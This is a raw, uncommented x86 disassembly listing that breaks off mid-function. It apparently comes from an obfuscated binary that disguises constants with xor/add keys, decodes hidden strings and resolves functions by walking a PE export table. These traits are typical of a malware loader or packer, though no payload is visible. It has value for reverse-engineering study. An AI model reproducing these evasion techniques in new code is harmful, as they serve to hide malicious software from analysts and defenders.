  426fd4:	mov    DWORD PTR [ebp-0xc],eax
  426fd7:	mov    eax,DWORD PTR [ebp-0xc]
  426fda:	mov    eax,DWORD PTR [eax+0x28]
  426fdd:	call   0x426bd1
  426fe2:	mov    DWORD PTR [ebp+0x10],eax
  426fe5:	push   DWORD PTR [ebp+0x10]
  426fe8:	mov    edx,DWORD PTR [ebp-0x8]
  426feb:	call   0x426d78
  426ff0:	mov    eax,DWORD PTR [ebp-0x4]
  426ff3:	xor    eax,edi
  426ff5:	add    eax,esi
  426ff7:	cmp    eax,ebx
  426ff9:	jne    0x427003
  426ffb:	mov    eax,DWORD PTR [ebp-0x8]
  426ffe:	call   0x426c5f
  427003:	mov    eax,DWORD PTR [ebp-0x14]
  427006:	xor    eax,edi
  427008:	add    eax,esi
  42700a:	push   eax
  42700b:	push   DWORD PTR [ebp-0x10]
  42700e:	mov    eax,DWORD PTR [ebp-0x8]
  427011:	call   0x42698b
  427016:	mov    ecx,DWORD PTR [ebp-0x4]
  427019:	xor    ecx,edi
  42701b:	add    ecx,esi
  42701d:	cmp    eax,ecx
  42701f:	je     0x427044
  427021:	mov    eax,DWORD PTR [ebp+0xc]
  427024:	mov    eax,DWORD PTR [eax]
  427026:	mov    DWORD PTR [ebp+0xc],eax
  427029:	mov    eax,DWORD PTR [ebp+0x8]
  42702c:	mov    ecx,DWORD PTR [ebp+0xc]
  42702f:	add    eax,0x14
  427032:	cmp    ecx,eax
  427034:	jne    0x426fce
  427036:	mov    eax,DWORD PTR [ebp-0x4]
  427039:	xor    eax,edi
  42703b:	add    eax,esi
  42703d:	pop    ebx
  42703e:	pop    edi
  42703f:	pop    esi
  427040:	leave  
  427041:	ret    0xc
  427044:	mov    eax,DWORD PTR [ebp-0xc]
  427047:	mov    eax,DWORD PTR [eax+0x18]
  42704a:	jmp    0x42703d
  42704c:	push   ebp
  42704d:	mov    ebp,esp
  42704f:	mov    eax,DWORD PTR [ebp+0xc]
  427052:	sub    esp,0x10
  427055:	cmp    DWORD PTR [ebp+0x8],0x0
  427059:	push   ebx
  42705a:	push   esi
  42705b:	push   edi
  42705c:	je     0x427111
  427062:	test   eax,eax
  427064:	je     0x427111
  42706a:	movzx  eax,WORD PTR [eax+0x20]
  42706e:	mov    ecx,eax
  427070:	mov    DWORD PTR [ebp-0x10],eax
  427073:	xor    edx,edx
  427075:	and    DWORD PTR [ebp-0x8],edx
  427078:	mov    eax,0x8a99
  42707d:	xor    ecx,eax
  42707f:	add    ecx,0x3b5b
  427085:	mov    DWORD PTR [ebp-0xc],ecx
  427088:	and    DWORD PTR [ebp-0x4],0x0
  42708c:	xor    ecx,ecx
  42708e:	push   0x7d
  427090:	pop    edi
  427091:	cmp    cx,WORD PTR [ebp-0xc]
  427095:	jae    0x4270fb
  427097:	lea    esi,[edx-0x3b5b]
  42709d:	xor    esi,eax
  42709f:	movzx  ecx,WORD PTR [ebp-0x4]
  4270a3:	mov    ebx,DWORD PTR [ebp+0xc]
  4270a6:	lea    ecx,[ebx+ecx*4]
  4270a9:	cmp    WORD PTR [ecx+0x2],si
  4270ad:	jne    0x4270e6
  4270af:	movzx  ecx,WORD PTR [ecx]
  4270b2:	mov    edi,0x4e3c
  4270b7:	cmp    cx,di
  4270ba:	jne    0x4270c8
  4270bc:	mov    ebx,DWORD PTR [ebp+0x8]
  4270bf:	movzx  edi,dx
  4270c2:	cmp    BYTE PTR [edi+ebx*1],0x0
  4270c6:	je     0x4270f5
  4270c8:	mov    ebx,DWORD PTR [ebp+0x8]
  4270cb:	movzx  edi,dx
  4270ce:	movsx  di,BYTE PTR [edi+ebx*1]
  4270d3:	mov    ebx,0x3b5b
  4270d8:	sub    di,bx
  4270db:	xor    di,ax
  4270de:	cmp    cx,di
  4270e1:	je     0x4270f5
  4270e3:	push   0xffffff83
  4270e5:	pop    edi
  4270e6:	inc    DWORD PTR [ebp-0x4]
  4270e9:	mov    cx,WORD PTR [ebp-0xc]
  4270ed:	cmp    WORD PTR [ebp-0x4],cx
  4270f1:	jb     0x42709f
  4270f3:	jmp    0x4270fb
  4270f5:	inc    DWORD PTR [ebp-0x8]
  4270f8:	push   0xffffff82
  4270fa:	pop    edi
  4270fb:	mov    esi,DWORD PTR [ebp+0x8]
  4270fe:	movzx  ecx,dx
  427101:	cmp    BYTE PTR [ecx+esi*1],0x0
  427105:	je     0x42711a
  427107:	inc    edx
  427108:	cmp    edi,0xffffff83
  42710b:	jne    0x427088
  427111:	xor    eax,eax
  427113:	pop    edi
  427114:	pop    esi
  427115:	pop    ebx
  427116:	leave  
  427117:	ret    0x8
  42711a:	mov    ecx,DWORD PTR [ebp-0x8]
  42711d:	add    ecx,0xffffc4a5
  427123:	xor    cx,ax
  427126:	xor    eax,eax
  427128:	cmp    cx,WORD PTR [ebp-0x10]
  42712c:	sete   al
  42712f:	jmp    0x427113
  427131:	push   ebp
  427132:	mov    ebp,esp
  427134:	sub    esp,0x50
  427137:	push   edi
  427138:	mov    edi,eax
  42713a:	mov    eax,DWORD PTR [edi+0x1a8]
  427140:	cmp    DWORD PTR [eax],0x0
  427143:	jne    0x42714c
  427145:	xor    eax,eax
  427147:	jmp    0x42727d
  42714c:	push   DWORD PTR [ebp+0x8]
  42714f:	push   0x2c
  427151:	pop    eax
  427152:	call   0x426ee1
  427157:	mov    edx,DWORD PTR [edi+0x1ac]
  42715d:	lea    eax,[edi+0x22]
  427160:	mov    DWORD PTR [ebp-0x4c],eax
  427163:	lea    eax,[edi+0x44]
  427166:	mov    DWORD PTR [ebp-0x48],eax
  427169:	lea    eax,[edi+0x66]
  42716c:	mov    DWORD PTR [ebp-0x44],eax
  42716f:	lea    eax,[edi+0x88]
  427175:	mov    DWORD PTR [ebp-0x40],eax
  427178:	lea    eax,[edi+0xaa]
  42717e:	mov    DWORD PTR [ebp-0x3c],eax
  427181:	lea    eax,[edi+0xcc]
  427187:	mov    DWORD PTR [ebp-0x38],eax
  42718a:	lea    eax,[edi+0xee]
  427190:	mov    DWORD PTR [ebp-0x34],eax
  427193:	lea    eax,[edi+0x110]
  427199:	mov    DWORD PTR [ebp-0x30],eax
  42719c:	lea    eax,[edi+0x132]
  4271a2:	mov    DWORD PTR [ebp-0x2c],eax
  4271a5:	lea    eax,[edi+0x154]
  4271ab:	push   edi
  4271ac:	mov    DWORD PTR [ebp-0x50],edi
  4271af:	mov    DWORD PTR [ebp-0x28],eax
  4271b2:	call   0x4272b1
  4271b7:	push   eax
  4271b8:	mov    eax,DWORD PTR [edi+0x1a8]
  4271be:	push   DWORD PTR [eax]
  4271c0:	call   0x426f52
  4271c5:	mov    DWORD PTR [ebp-0x10],eax
  4271c8:	test   eax,eax
  4271ca:	je     0x42727d
  4271d0:	mov    ecx,DWORD PTR [eax+0x3c]
  4271d3:	push   ebx
  4271d4:	push   esi
  4271d5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4271d9:	add    esi,eax
  4271db:	mov    edi,DWORD PTR [esi+0x24]
  4271de:	mov    ecx,DWORD PTR [esi+0x1c]
  4271e1:	mov    edx,DWORD PTR [esi+0x20]
  4271e4:	mov    ebx,DWORD PTR [esi+0x18]
  4271e7:	add    edi,eax
  4271e9:	mov    DWORD PTR [ebp-0x20],edi
  4271ec:	mov    edi,DWORD PTR [esi+0x14]
  4271ef:	add    ecx,eax
  4271f1:	add    edx,eax
  4271f3:	mov    DWORD PTR [ebp-0xc],ecx
  4271f6:	mov    DWORD PTR [ebp-0x1c],edx
  4271f9:	mov    DWORD PTR [ebp-0x8],edi
  4271fc:	cmp    edi,ebx
  4271fe:	ja     0x427203
  427200:	mov    DWORD PTR [ebp-0x8],ebx
  427203:	xor    ebx,ebx
  427205:	mov    DWORD PTR [ebp-0x18],ebx
  427208:	cmp    DWORD PTR [ebp-0x8],ebx
  42720b:	jbe    0x42727b
  42720d:	jmp    0x427212
  42720f:	mov    edx,DWORD PTR [ebp-0x1c]
  427212:	mov    edi,DWORD PTR [ebp-0x20]
  427215:	movzx  edi,WORD PTR [edi+ebx*2]
  427219:	cmp    ebx,DWORD PTR [esi+0x18]
  42721c:	jae    0x42727b
  42721e:	cmp    edi,DWORD PTR [esi+0x14]
  427221:	jae    0x42727b
  427223:	mov    ebx,DWORD PTR [edx+ebx*4]
  427226:	mov    edx,DWORD PTR [ebp+0x8]
  427229:	mov    edi,DWORD PTR [ecx+edi*4]
  42722c:	mov    DWORD PTR [ebp-0x4],edx
  42722f:	lea    edx,[ebp-0x50]
  427232:	add    ebx,eax
  427234:	add    edi,eax
  427236:	sub    edx,DWORD PTR [ebp+0x8]
  427239:	mov    DWORD PTR [ebp-0x14],0xb
  427240:	mov    DWORD PTR [ebp-0x24],edx
  427243:	mov    edx,DWORD PTR [ebp-0x4]
  427246:	cmp    DWORD PTR [edx],0x0
  427249:	jne    0x427266
  42724b:	mov    eax,DWORD PTR [ebp-0x24]
  42724e:	push   DWORD PTR [eax+edx*1]
  427251:	push   ebx
  427252:	call   0x42704c
  427257:	mov    ecx,DWORD PTR [ebp-0xc]
  42725a:	test   eax,eax
  42725c:	je     0x427263
  42725e:	mov    eax,DWORD PTR [ebp-0x4]
  427261:	mov    DWORD PTR [eax],edi
  427263:	mov    eax,DWORD PTR [ebp-0x10]
  427266:	add    DWORD PTR [ebp-0x4],0x4
  42726a:	dec    DWORD PTR [ebp-0x14]
  42726d:	jne    0x427243
  42726f:	mov    ebx,DWORD PTR [ebp-0x18]
  427272:	inc    ebx
  427273:	mov    DWORD PTR [ebp-0x18],ebx
  427276:	cmp    ebx,DWORD PTR [ebp-0x8]
  427279:	jb     0x42720f
  42727b:	pop    esi
  42727c:	pop    ebx
  42727d:	pop    edi
  42727e:	leave  
  42727f:	ret    0x4
  427282:	push   ebp
  427283:	mov    ebp,esp
  427285:	mov    eax,DWORD PTR [ebp+0x8]
  427288:	push   esi
  427289:	push   DWORD PTR [eax+0x1e0]
  42728f:	lea    esi,[eax+0x198]
  427295:	mov    eax,DWORD PTR [ebp+0x8]
  427298:	call   0x427131
  42729d:	mov    ecx,DWORD PTR [esi]
  42729f:	mov    DWORD PTR [ecx],eax
  4272a1:	mov    eax,DWORD PTR [esi]
  4272a3:	xor    ecx,ecx
  4272a5:	cmp    DWORD PTR [eax],ecx
  4272a7:	pop    esi
  4272a8:	setne  cl
  4272ab:	mov    eax,ecx
  4272ad:	pop    ebp
  4272ae:	ret    0x4
  4272b1:	mov    ecx,DWORD PTR [edi+0x188]
  4272b7:	push   ebx
  4272b8:	jmp    0x4272cd
  4272ba:	xor    eax,0x8a99
  4272bf:	add    eax,0x3b5b
  4272c4:	mov    WORD PTR [ecx],ax
  4272c7:	add    ecx,0x2
  4272ca:	add    edx,0x2
  4272cd:	movzx  eax,WORD PTR [edx]
  4272d0:	mov    ebx,0x4e3c
  4272d5:	cmp    ax,bx
  4272d8:	jne    0x4272ba
  4272da:	xor    eax,eax
  4272dc:	mov    WORD PTR [ecx],ax
  4272df:	mov    eax,DWORD PTR [edi+0x188]
  4272e5:	pop    ebx
  4272e6:	ret    
  4272e7:	push   edi
  4272e8:	mov    edi,eax
  4272ea:	mov    eax,DWORD PTR [esi+0x188]
  4272f0:	shl    edi,0x6
  4272f3:	add    eax,edi
  4272f5:	jmp    0x427301
  4272f7:	xor    cl,0x7d
  4272fa:	add    cl,0x2
  4272fd:	mov    BYTE PTR [eax],cl
  4272ff:	inc    eax
  427300:	inc    edx
  427301:	mov    cl,BYTE PTR [edx]
  427303:	cmp    cl,0x83
  427306:	jne    0x4272f7
  427308:	mov    BYTE PTR [eax],0x0
  42730b:	mov    eax,DWORD PTR [esi+0x188]
  427311:	add    eax,edi
  427313:	pop    edi
  427314:	ret    
  427315:	push   ebp
  427316:	mov    ebp,esp
  427318:	sub    esp,0x14
  42731b:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  427322:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  427329:	mov    eax,DWORD PTR [ebx]
  42732b:	mov    DWORD PTR [ebp-0x8],eax
  42732e:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  427335:	push   esi
  427336:	push   edi
  427337:	mov    DWORD PTR [ebp-0x14],0xead71881
  42733e:	mov    edi,DWORD PTR [ebp-0x4]
  427341:	mov    ecx,DWORD PTR [ebp-0x10]
  427344:	mov    eax,0x75108ac
  427349:	xor    edi,eax
  42734b:	mov    edx,0x3272f3
  427350:	xor    ecx,eax
  427352:	add    edi,edx
  427354:	add    ecx,edx
  427356:	imul   edi,ecx
  427359:	jmp    0x4273a1
  42735b:	mov    ecx,DWORD PTR [ebp-0x8]
  42735e:	mov    esi,DWORD PTR [ebp-0x4]
  427361:	xor    ecx,eax
  427363:	xor    esi,eax
  427365:	add    ecx,edx
  427367:	add    esi,edx
  427369:	test   esi,ecx
  42736b:	mov    esi,DWORD PTR [ebp-0x8]
  42736e:	mov    ecx,DWORD PTR [ebp-0x4]
  427371:	je     0x427388
  427373:	xor    ecx,eax
  427375:	xor    esi,eax
  427377:	add    ecx,edx
  427379:	add    esi,edx
  42737b:	shr    esi,cl
  42737d:	mov    ecx,DWORD PTR [ebp-0x14]
  427380:	xor    ecx,eax
  427382:	add    ecx,edx
  427384:	xor    esi,ecx
  427386:	jmp    0x427392
  427388:	xor    esi,eax
  42738a:	xor    ecx,eax
  42738c:	add    esi,edx
  42738e:	add    ecx,edx
  427390:	shr    esi,cl
  427392:	mov    DWORD PTR [ebp-0x8],esi
  427395:	mov    ecx,DWORD PTR [ebp-0x4]
  427398:	xor    ecx,eax
  42739a:	lea    edi,[edi+ecx*1+0x3272f3]
  4273a1:	mov    ecx,DWORD PTR [ebp-0xc]
  4273a4:	mov    esi,DWORD PTR [ebp-0x4]
  4273a7:	xor    esi,eax
  4273a9:	xor    ecx,eax
  4273ab:	sub    ecx,esi
  4273ad:	cmp    edi,ecx
  4273af:	jbe    0x42735b
  4273b1:	mov    eax,DWORD PTR [ebp-0x8]
  4273b4:	pop    edi
  4273b5:	mov    DWORD PTR [ebx],eax
  4273b7:	mov    eax,DWORD PTR [ebp-0x8]
  4273ba:	pop    esi
  4273bb:	leave  
  4273bc:	ret    
  4273bd:	push   ebp
  4273be:	mov    ebp,esp
  4273c0:	sub    esp,0x38
  4273c3:	push   ebx
  4273c4:	mov    ebx,0xf89c85a1
  4273c9:	mov    DWORD PTR [ebp-0x4],ebx
  4273cc:	lea    ecx,[ebx+0x1]
  4273cf:	mov    DWORD PTR [ebp-0x24],ecx
  4273d2:	mov    eax,DWORD PTR [ebp-0x4]
  4273d5:	mov    edx,DWORD PTR [ebp+0x8]
  4273d8:	push   esi
  4273d9:	mov    esi,0x75108ac
  4273de:	xor    eax,esi
  4273e0:	push   edi
  4273e1:	mov    edi,0x3272f3
  4273e6:	add    eax,edi
  4273e8:	cmp    edx,eax
  4273ea:	mov    eax,DWORD PTR [ebp-0x4]
  4273ed:	je     0x427552
  4273f3:	mov    edx,DWORD PTR [ebp+0xc]
  4273f6:	xor    eax,esi
  4273f8:	add    eax,edi
  4273fa:	cmp    edx,eax
  4273fc:	je     0x42754f
  427402:	mov    eax,DWORD PTR [ebp+0x10]
  427405:	mov    edx,DWORD PTR [ebp+0xc]
  427408:	mov    DWORD PTR [ebp-0x14],eax
  42740b:	mov    eax,DWORD PTR [ebp+0x8]
  42740e:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  427415:	mov    DWORD PTR [ebp-0xc],eax
  427418:	lea    eax,[ebx+0x2]
  42741b:	mov    DWORD PTR [ebp-0x1c],eax
  42741e:	mov    DWORD PTR [ebp-0x10],ebx
  427421:	mov    DWORD PTR [ebp+0xc],ecx
  427424:	mov    DWORD PTR [ebp+0x10],eax
  427427:	mov    eax,DWORD PTR [ebp+0xc]
  42742a:	xor    eax,esi
  42742c:	mov    DWORD PTR [ebp-0x20],edx
  42742f:	sub    edx,eax
  427431:	sub    edx,edi
  427433:	mov    DWORD PTR [ebp+0x8],edx
  427436:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  42743d:	jmp    0x42753f
  427442:	mov    eax,DWORD PTR [ebp+0xc]
  427445:	mov    ecx,DWORD PTR [ebp+0xc]
  427448:	xor    eax,esi
  42744a:	xor    ecx,esi
  42744c:	lea    ecx,[eax+ecx*1+0x64e5e6]
  427453:	mov    eax,DWORD PTR [ebp+0x8]
  427456:	xor    edx,edx
  427458:	div    ecx
  42745a:	mov    eax,DWORD PTR [ebp+0x10]
  42745d:	mov    ecx,DWORD PTR [ebp+0xc]
  427460:	xor    eax,esi
  427462:	xor    ecx,esi
  427464:	sub    eax,ecx
  427466:	cmp    edx,eax
  427468:	jne    0x4274fe
  42746e:	mov    eax,DWORD PTR [ebp+0x8]
  427471:	mov    ecx,DWORD PTR [ebp-0xc]
  427474:	mov    dl,BYTE PTR [eax+ecx*1]
  427477:	mov    eax,DWORD PTR [ebp-0x10]
  42747a:	mov    ecx,DWORD PTR [ebp-0x8]
  42747d:	xor    eax,esi
  42747f:	xor    ecx,esi
  427481:	add    eax,edi
  427483:	add    ecx,edi
  427485:	cmp    eax,ecx
  427487:	jae    0x4274cf
  427489:	lea    ecx,[eax-0x3272f3]
  42748f:	mov    DWORD PTR [ebp-0x4],ecx
  427492:	mov    ebx,DWORD PTR [ebp-0x4]
  427495:	xor    ebx,esi
  427497:	add    ebx,0x7f55d8e3
  42749d:	lea    ecx,[ebp+eax*4-0x38]
  4274a1:	mov    DWORD PTR [ecx],ebx
  4274a3:	mov    ebx,DWORD PTR [ecx]
  4274a5:	cmp    ebx,0x244ecb9c
  4274ab:	jbe    0x4274b5
  4274ad:	add    DWORD PTR [ecx],0x405fcdd
  4274b3:	jmp    0x4274bb
  4274b5:	add    DWORD PTR [ecx],0xfdaf4323
  4274bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4274be:	xor    ecx,esi
  4274c0:	inc    eax
  4274c1:	inc    DWORD PTR [ebp-0x4]
  4274c4:	add    ecx,edi
  4274c6:	cmp    eax,ecx
  4274c8:	jb     0x427492
  4274ca:	mov    ebx,0xf89c85a1
  4274cf:	cmp    DWORD PTR [ebp-0x14],0x0
  4274d3:	jne    0x4274dd
  4274d5:	xor    dl,0x7d
  4274d8:	add    dl,0x2
  4274db:	jmp    0x4274f3
  4274dd:	mov    eax,DWORD PTR [ebp-0x18]
  4274e0:	xor    al,0xac
  4274e2:	mov    cl,0xd
  4274e4:	sub    cl,al
  4274e6:	add    dl,cl
  4274e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4274eb:	xor    cl,0xac
  4274ee:	sub    cl,0xd
  4274f1:	ror    dl,cl
  4274f3:	xor    eax,eax
  4274f5:	mov    eax,DWORD PTR [ebp+0x8]
  4274f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4274fb:	mov    BYTE PTR [eax+ecx*1],dl
  4274fe:	mov    eax,DWORD PTR [ebp+0x8]
  427501:	mov    ecx,DWORD PTR [ebp-0x10]
  427504:	sub    eax,edi
  427506:	xor    eax,esi
  427508:	cmp    eax,ecx
  42750a:	jne    0x42752d
  42750c:	mov    eax,DWORD PTR [ebp+0x10]
  42750f:	mov    ecx,DWORD PTR [ebp+0xc]
  427512:	xor    eax,esi
  427514:	xor    ecx,esi
  427516:	sub    eax,ecx
  427518:	mov    ecx,DWORD PTR [ebp-0x20]
  42751b:	sub    eax,edi
  42751d:	xor    eax,esi
  42751f:	mov    DWORD PTR [ebp+0x10],eax
  427522:	mov    eax,DWORD PTR [ebp+0xc]
  427525:	xor    eax,esi
  427527:	sub    ecx,eax
  427529:	sub    ecx,edi
  42752b:	jmp    0x42753c
  42752d:	mov    eax,DWORD PTR [ebp+0xc]
  427530:	xor    eax,esi
  427532:	mov    ecx,0xffcd8d0d
  427537:	sub    ecx,eax
  427539:	add    ecx,DWORD PTR [ebp+0x8]
  42753c:	mov    DWORD PTR [ebp+0x8],ecx
  42753f:	mov    eax,DWORD PTR [ebp+0x10]
  427542:	cmp    eax,ebx
  427544:	jne    0x427442
  42754a:	mov    eax,DWORD PTR [ebp-0x24]
  42754d:	jmp    0x427552
  42754f:	mov    eax,DWORD PTR [ebp-0x4]
  427552:	xor    eax,esi
  427554:	add    eax,edi
  427556:	pop    edi
  427557:	pop    esi
  427558:	pop    ebx
  427559:	leave  
  42755a:	ret    0xc
  42755d:	push   ebp
  42755e:	mov    ebp,esp
  427560:	sub    esp,0x420
  427566:	mov    DWORD PTR [ebp-0x14],0xf89c85a1
  42756d:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  427574:	mov    DWORD PTR [ebp-0x18],0xf89c86a1
  42757b:	push   ebx
  42757c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  427583:	mov    eax,DWORD PTR [ebp-0x14]
  427586:	push   esi
  427587:	mov    esi,0x75108ac
  42758c:	push   edi
  42758d:	xor    eax,esi
  42758f:	mov    edi,0x3272f3
  427594:	add    eax,edi
  427596:	mov    DWORD PTR [ebp-0x8],eax
  427599:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  4275a0:	mov    DWORD PTR [ebp-0x4],0xead71881
  4275a7:	mov    DWORD PTR [ebp-0x10],0x8
  4275ae:	mov    ecx,ecx
  4275b0:	mov    eax,DWORD PTR [ebp-0xc]
  4275b3:	mov    ecx,DWORD PTR [ebp-0x14]
  4275b6:	xor    eax,esi
  4275b8:	xor    ecx,esi
  4275ba:	add    eax,edi
  4275bc:	add    ecx,edi
  4275be:	imul   eax,ecx
  4275c1:	jmp    0x4275f4
  4275c3:	mov    eax,DWORD PTR [ebp-0x4]
  4275c6:	sub    eax,edi
  4275c8:	xor    eax,esi
  4275ca:	mov    DWORD PTR [ebp-0x8],eax
  4275cd:	lea    ebx,[ebp-0x8]
  4275d0:	call   0x427315
  4275d5:	mov    DWORD PTR [ebp-0x8],eax
  4275d8:	mov    eax,DWORD PTR [ebp-0x8]
  4275db:	mov    ecx,DWORD PTR [ebp-0x4]
  4275de:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4275e5:	mov    eax,DWORD PTR [ebp-0xc]
  4275e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4275eb:	xor    eax,esi
  4275ed:	lea    eax,[eax+ecx*1+0x3272f3]
  4275f4:	mov    DWORD PTR [ebp-0x4],eax
  4275f7:	mov    eax,DWORD PTR [ebp-0x18]
  4275fa:	mov    ecx,DWORD PTR [ebp-0xc]
  4275fd:	xor    ecx,esi
  4275ff:	xor    eax,esi
  427601:	sub    eax,ecx
  427603:	mov    ecx,DWORD PTR [ebp-0x4]
  427606:	cmp    ecx,eax
  427608:	jbe    0x4275c3
  42760a:	mov    eax,DWORD PTR [ebp-0x1c]
  42760d:	xor    eax,esi
  42760f:	add    eax,edi
  427611:	mov    DWORD PTR [ebp-0x8],eax
  427614:	mov    DWORD PTR [ebp-0x18],0xf89c86a0
  42761b:	mov    ebx,ebx
  42761d:	jmp    0x427680
  42761f:	mov    ecx,DWORD PTR [ebp-0x20]
  427622:	mov    eax,DWORD PTR [ebp-0x8]
  427625:	xor    ecx,esi
  427627:	add    ecx,edi
  427629:	shr    eax,cl
  42762b:	mov    DWORD PTR [ebp-0x4],eax
  42762e:	mov    eax,DWORD PTR [ebp+0x8]
  427631:	mov    cl,BYTE PTR [eax]
  427633:	mov    BYTE PTR [ebp+0xb],cl
  427636:	mov    cl,BYTE PTR [ebp+0xb]
  427639:	mov    edx,DWORD PTR [ebp-0x8]
  42763c:	movzx  ecx,cl
  42763f:	xor    ecx,edx
  427641:	mov    DWORD PTR [ebp+0x8],ecx
  427644:	mov    ecx,DWORD PTR [ebp-0x18]
  427647:	mov    edx,DWORD PTR [ebp+0x8]
  42764a:	xor    ecx,esi
  42764c:	add    ecx,edi
  42764e:	and    ecx,edx
  427650:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427657:	mov    edx,DWORD PTR [ebp-0x4]
  42765a:	xor    ecx,edx
  42765c:	mov    DWORD PTR [ebp-0x8],ecx
  42765f:	mov    ecx,DWORD PTR [ebp-0xc]
  427662:	xor    ecx,esi
  427664:	lea    eax,[eax+ecx*1+0x3272f3]
  42766b:	mov    DWORD PTR [ebp+0x8],eax
  42766e:	mov    eax,DWORD PTR [ebp-0xc]
  427671:	xor    eax,esi
  427673:	mov    ecx,0xffcd8d0d
  427678:	sub    ecx,eax
  42767a:	add    ecx,DWORD PTR [ebp-0x10]
  42767d:	mov    DWORD PTR [ebp-0x10],ecx
  427680:	mov    eax,DWORD PTR [ebp-0x14]
  427683:	mov    ecx,DWORD PTR [ebp-0x10]
  427686:	xor    eax,esi
  427688:	add    eax,edi
  42768a:	cmp    ecx,eax
  42768c:	jne    0x42761f
  42768e:	mov    eax,DWORD PTR [ebp-0x1c]
  427691:	mov    ecx,DWORD PTR [ebp-0x8]
  427694:	xor    eax,esi
  427696:	add    eax,edi
  427698:	pop    edi
  427699:	pop    esi
  42769a:	xor    eax,ecx
  42769c:	pop    ebx
  42769d:	leave  
  42769e:	ret    0x4
  4276a1:	push   ebp
  4276a2:	mov    ebp,esp
  4276a4:	mov    eax,DWORD PTR [ebp+0x1c]
  4276a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4276aa:	mov    edx,DWORD PTR [ebp+0x10]
  4276ad:	mov    eax,DWORD PTR [eax+0x190]
  4276b3:	mov    eax,DWORD PTR [eax]
  4276b5:	sub    esp,0x64
  4276b8:	push   ebx
  4276b9:	push   esi
  4276ba:	push   edi
  4276bb:	mov    edi,0x75108ac
  4276c0:	xor    ecx,edi
  4276c2:	mov    ebx,0x3272f3
  4276c7:	add    ecx,ebx
  4276c9:	cmp    ecx,edx
  4276cb:	jne    0x4276dc
  4276cd:	or     DWORD PTR ds:0x3750c3f,0x4263eb28
  4276d7:	jmp    0x427bd8
  4276dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4276df:	mov    esi,DWORD PTR [ebp+0x14]
  4276e2:	mov    edx,DWORD PTR [esi]
  4276e4:	xor    ecx,edi
  4276e6:	add    ecx,ebx
  4276e8:	cmp    edx,ecx
  4276ea:	je     0x427b93
  4276f0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276f3:	mov    DWORD PTR [ebp-0x1c],eax
  4276f6:	mov    DWORD PTR [ebp+0x1c],ecx
  4276f9:	mov    ecx,DWORD PTR [ebp+0x18]
  4276fc:	mov    eax,DWORD PTR [esi]
  4276fe:	mov    DWORD PTR [ebp-0x20],eax
  427701:	mov    DWORD PTR [ebp+0x8],0xf89c85a1
  427708:	mov    edx,0xf89c85a2
  42770d:	mov    DWORD PTR [ebp-0x8],edx
  427710:	mov    eax,DWORD PTR [ebp+0x1c]
  427713:	mov    DWORD PTR [ebp+0x1c],eax
  427716:	mov    eax,DWORD PTR [ebp+0x1c]
  427719:	mov    eax,DWORD PTR [eax+0x190]
  42771f:	mov    eax,DWORD PTR [eax]
  427721:	mov    DWORD PTR [ebp-0x24],ecx
  427724:	mov    ecx,DWORD PTR [ebp+0x1c]
  427727:	mov    ecx,DWORD PTR [ecx+0x190]
  42772d:	mov    ecx,DWORD PTR [ecx]
  42772f:	add    ecx,DWORD PTR [eax+0x3c]
  427732:	mov    DWORD PTR [ebp+0x10],ecx
  427735:	mov    eax,DWORD PTR [ebp+0x8]
  427738:	xor    eax,edi
  42773a:	add    eax,ebx
  42773c:	mov    DWORD PTR [ebp-0x4],eax
  42773f:	mov    eax,DWORD PTR [ebp+0x8]
  427742:	xor    eax,edi
  427744:	add    eax,ebx
  427746:	mov    DWORD PTR [ebp+0x18],eax
  427749:	mov    eax,DWORD PTR [ebp+0x10]
  42774c:	mov    eax,DWORD PTR [eax+0x50]
  42774f:	sub    eax,0xc
  427752:	mov    DWORD PTR [ebp-0x28],eax
  427755:	mov    eax,DWORD PTR [ebp+0x10]
  427758:	mov    eax,DWORD PTR [eax+0x38]
  42775b:	mov    ecx,DWORD PTR [ebp+0x10]
  42775e:	dec    eax
  42775f:	test   DWORD PTR [ecx+0x54],eax
  427762:	mov    eax,DWORD PTR [ebp+0x10]
  427765:	je     0x42777f
  427767:	mov    eax,DWORD PTR [eax+0x38]
  42776a:	mov    ecx,DWORD PTR [ebp+0x10]
  42776d:	mov    ecx,DWORD PTR [ecx+0x54]
  427770:	dec    eax
  427771:	not    eax
  427773:	and    ecx,eax
  427775:	mov    eax,DWORD PTR [ebp+0x10]
  427778:	mov    eax,DWORD PTR [eax+0x38]
  42777b:	add    eax,ecx
  42777d:	jmp    0x427782
  42777f:	mov    eax,DWORD PTR [eax+0x54]
  427782:	mov    DWORD PTR [ebp+0x1c],eax
  427785:	mov    eax,DWORD PTR [ebp+0x8]
  427788:	xor    eax,edi
  42778a:	add    eax,ebx
  42778c:	mov    DWORD PTR [ebp+0x18],eax
  42778f:	mov    eax,DWORD PTR [ebp+0x8]
  427792:	xor    eax,edi
  427794:	add    eax,ebx
  427796:	mov    DWORD PTR [ebp+0x18],eax
  427799:	mov    eax,DWORD PTR [ebp+0x8]
  42779c:	mov    ecx,DWORD PTR [ebp-0x24]
  42779f:	xor    eax,edi
  4277a1:	add    eax,ebx
  4277a3:	mov    DWORD PTR [ecx],eax
  4277a5:	mov    DWORD PTR [ebp+0x18],edx
  4277a8:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  4277af:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  4277b6:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  4277bd:	mov    eax,DWORD PTR [ebp-0x8]
  4277c0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4277c3:	xor    eax,edi
  4277c5:	add    eax,ebx
  4277c7:	imul   eax,ecx
  4277ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4277cd:	mov    edx,DWORD PTR [ebp-0x28]
